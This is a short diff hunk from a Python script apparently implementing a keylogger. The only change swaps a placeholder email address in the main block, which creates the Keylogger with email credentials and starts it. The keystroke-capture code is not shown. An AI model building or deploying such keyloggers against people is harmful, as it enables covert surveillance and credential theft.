@@ -53,7 +53,7 @@ class Keylogger:
 # To avoid creating separate file just to run the Keylogger class, we put the following if statement.
 # This check ensures that the lines below are only executed when this script is run directly (and not imported).
 if __name__ == "__main__":
-    mail = "email@gmail.com"
+    mail = "email@email.com"
     pwd = "password"
     keylogger = Keylogger(mail, pwd)
     keylogger.start()
